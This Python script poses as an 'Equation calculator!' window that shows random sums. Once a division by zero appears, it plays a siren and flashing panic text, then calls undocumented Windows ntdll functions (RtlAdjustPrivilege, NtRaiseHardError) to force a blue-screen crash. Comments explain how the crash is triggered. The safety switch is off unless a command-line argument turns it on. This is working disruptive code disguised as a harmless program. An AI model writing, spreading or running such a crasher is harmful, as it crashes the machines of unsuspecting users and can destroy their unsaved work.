from ctypes import windll, c_int, c_uint, c_ulong, POINTER, byref
import random
import sys
import tkinter as tk
from PIL import Image, ImageTk
import threading
import atexit
import simpleaudio as sa

failsafe = True

def crasher():

    if failsafe:
        exit(0)

    # nullptr is just a null pointer, which is used later
    nullptr = POINTER(c_int)()

    # Here, syscall RtlAdjustPrivilege is used to elevate the process's privileges
    # It is required to elevate the process's privileges for it to trigger the HardError
    # Let us look at the parameters below:
    
    # c_uint(19):       The privilege level to be adjusted. In this case, it corresponds to the 
    #                   SeShutdownPrivilege privilege, which allows the calling process to shut down the system.  
    # c_uint(1):        The new privilege state, which is set to 1 to enable the privilege.
    # c_uint(0):        The third parameter is not used and is set to 0.
    # byref(c_int()):   the last parameter is used to store the previous privilege state, but it's passed 
    #                   a null pointer (nullptr), so it won't be able to retrieve the previous state.

    windll.ntdll.RtlAdjustPrivilege(
        c_uint(19), 
        c_uint(1), 
        c_uint(0), 
        byref(c_int())
    )


    # Below function is used to trigger a Hard Error on the system. Takes 6 parameters:
    # c_ulong(0xC0000094):  Its the status error code, corresponding to the DIVIDE_BY_ZERO_ERROR, which is self explanatory. 
    #                       Very harmless :)
    # c_ulong(0):           The second parameter is not used and is set to 0.
    # nullptr:              The third parameter is a pointer to a string that provides additional information about the error.
    #                       We dont need that so its pointing to null.
    # null_ptr:             The fourth parameter is a pointer to the context record, which has processor-specific context information,
    #                       which we dont need.
    # c_uint(6):            The fifth parameter specifies the type of the hard error. 6 indicates shutdown type error.
    # byref(c_uint()):      This parameter is used to store the response option selected by the user in response to the hard error.
    #                       Here, nulltpr is used (c_uint()) and hence the response wont be retrievable.

    windll.ntdll.NtRaiseHardError(
        c_ulong(0xC0000094),
        c_ulong(0), 
        nullptr, 
        nullptr, 
        c_uint(6), 
        byref(c_uint())
    )

    # Note: If you try to raise a hard error without elevating privileges, it will cause a memory access violation or some other
    #       memory-related error and the BSOD will not trigger.


def random_equation_generator(min_length=3, max_length=5):
    chooser = [False, True]

    choice = random.choices(chooser, weights=(100,10))

    operators = ['+', '-', '*', '/']
    equation_length = random.randint(min_length, max_length)
    equation = str(random.randint(1, 10))  

    for _ in range(equation_length - 1):
        operator = random.choice(operators)
        operand = str(random.randint(1, 10))  
        equation += f"{operator}{operand}"

    if choice[0]:
        equation += '/0'

    return equation


def panic(canvas, count):

    count += 1
    if count%2 == 0:
        color = "red"
    else:
        color = "blue"
    text_id = canvas.create_text(10, 470, anchor="nw", text="SYSTEM IS PANICKING!!!", fill=color, font=("Helvetica", 50))

    root.after(40, panic, canvas, count) 

def panic_starter(canvas):
    
    panic_thread = threading.Thread(target=panic, args=(canvas, 0))
    panic_thread.daemon = True
    panic_thread.start()


def update_canvas_text(canvas, text_id):
    new_string = random_equation_generator()
    canvas.delete(text_id)
    
    text_id = canvas.create_text(20, 250, anchor="nw", text=new_string, fill="white", font=("Helvetica", 48*2))
    
    canvas.update() 
    if "/0" in new_string:
        root.after(2000, display_gif_on_canvas, canvas, 'siren.gif', 'nuke_siren.wav', 150, 0, text_id)
    else:
        root.after(700, update_canvas_text, canvas, text_id) 



def display_next_frame(canvas, gif_image, x, y, stop_event):
    try:
        while not stop_event.is_set():
            gif_frame = ImageTk.PhotoImage(gif_image)
            canvas.create_image(x, y, anchor=tk.NW, image=gif_frame)

            canvas.gif_frame = gif_frame

            delay = gif_image.info['duration']

            canvas.update()
            stop_event.wait(delay / 1000.0)

            gif_image.seek(gif_image.tell() + 1)

    except EOFError:
        gif_image.seek(0)
        canvas.after(0, display_next_frame, canvas, gif_image, x, y, stop_event)

def play_sound(sound_file_path):
    wave_obj = sa.WaveObject.from_wave_file(sound_file_path)
    play_obj = wave_obj.play()
    play_obj.wait_done()

def display_gif_on_canvas(canvas, gif_image_path, sound_path, x, y, text_id):

    new_string = "DIVISION BY ZERO \n NOT ALLOWED!!!"
    canvas.delete(text_id)
    
    text_id = canvas.create_text(50, 280, anchor="nw", text=new_string, fill="white", font=("Helvetica", 60))

    gif_image = Image.open(gif_image_path)

    # Create a thread-safe queue to stop the animation
    stop_event = threading.Event()

    # Start the animation in a separate thread
    animation_thread = threading.Thread(target=display_next_frame, args=(canvas, gif_image, x, y, stop_event))
    animation_thread.daemon = True  # Set the thread as a daemon, so it will be terminated when the program exits
    animation_thread.start()

    # Play the sound in a separate thread
    sound_thread = threading.Thread(target=play_sound, args=(sound_path,))
    sound_thread.daemon = True
    sound_thread.start()

    root.after(4000, panic_starter, canvas)
    root.after(7000, crasher)

    # Bind the closing event of the Tkinter window to stop the animation thread
    atexit.register(lambda: stop_event.set())


if __name__ == "__main__":

    if "failsafe" in sys.argv or "debug" in sys.argv:
        failsafe = True
    else:
        failsafe = False

    root = tk.Tk()
    root.title("Equation calculator!")

    canvas = tk.Canvas(root, width=800, height=600, bg="black")
    canvas.pack()

    text_id = canvas.create_text(50, 250, anchor="nw", text="Equation calculator!", fill="white", font=("Helvetica", 60))

    root.after(2000, update_canvas_text, canvas, text_id) 

    root.mainloop()


    
        
